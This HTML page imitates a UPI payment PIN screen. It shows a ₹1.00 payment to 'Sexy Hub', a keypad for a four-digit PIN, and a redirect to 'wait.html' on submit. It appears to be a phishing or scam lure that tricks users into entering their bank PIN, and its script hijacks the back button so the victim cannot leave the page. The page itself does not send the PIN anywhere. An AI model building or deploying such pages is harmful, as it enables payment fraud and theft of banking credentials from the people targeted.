<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enter UPI PIN</title>
    <style>
        body {
            margin: 0;
            padding: 20px;
            font-family: Arial, sans-serif;
            background: #fff;
        }
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        .details {
            background: #f0f0f0;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
        }
        .pin-input {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin: 30px 0;
        }
        .pin-dot {
            width: 40px;
            height: 40px;
            border: 2px solid #333;
            border-radius: 5px;
            text-align: center;
            line-height: 40px;
            font-size: 20px;
        }
        .keypad {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            max-width: 300px;
            margin: 0 auto;
        }
        .key {
            padding: 20px;
            text-align: center;
            background: #f5f5f5;
            border: 1px solid #ddd;
            border-radius: 5px;
            cursor: pointer;
            font-size: 20px;
        }
        .key:active {
            background: #ddd;
        }
    </style>
</head>
<body>
    <div class="header">
        <h2>UPI Payment</h2>
    </div>
    
    <div class="details">
        <p>Sending: ₹1.00</p>
        <p>To: Sexy Hub</p>
    </div>
    
    <div style="text-align: center;">
        <p>ENTER UPI PIN</p>
        <div class="pin-input" id="pinInput">
            <div class="pin-dot"></div>
            <div class="pin-dot"></div>
            <div class="pin-dot"></div>
            <div class="pin-dot"></div>
        </div>
    </div>
    
    <div class="keypad">
        <div class="key" onclick="enterNum(1)">1</div>
        <div class="key" onclick="enterNum(2)">2</div>
        <div class="key" onclick="enterNum(3)">3</div>
        <div class="key" onclick="enterNum(4)">4</div>
        <div class="key" onclick="enterNum(5)">5</div>
        <div class="key" onclick="enterNum(6)">6</div>
        <div class="key" onclick="enterNum(7)">7</div>
        <div class="key" onclick="enterNum(8)">8</div>
        <div class="key" onclick="enterNum(9)">9</div>
        <div class="key" onclick="deleteNum()">⌫</div>
        <div class="key" onclick="enterNum(0)">0</div>
        <div class="key" onclick="submitPIN()">✓</div>
    </div>
    
    <script>
        let pin = [];
        
        function enterNum(num) {
            if (pin.length < 4) {
                pin.push(num);
                updateDisplay();
            }
        }
        
        function deleteNum() {
            pin.pop();
            updateDisplay();
        }
        
        function updateDisplay() {
            const dots = document.querySelectorAll('.pin-dot');
            dots.forEach((dot, i) => {
                dot.textContent = pin[i] ? '•' : '';
            });
        }
        
        function submitPIN() {
            if (pin.length === 4) {
                window.location.href = 'wait.html';
            }
        }
        
        history.pushState(null, null, location.href);
        window.onpopstate = function() {
            history.go(1);
        };
    </script>
</body>
</html>
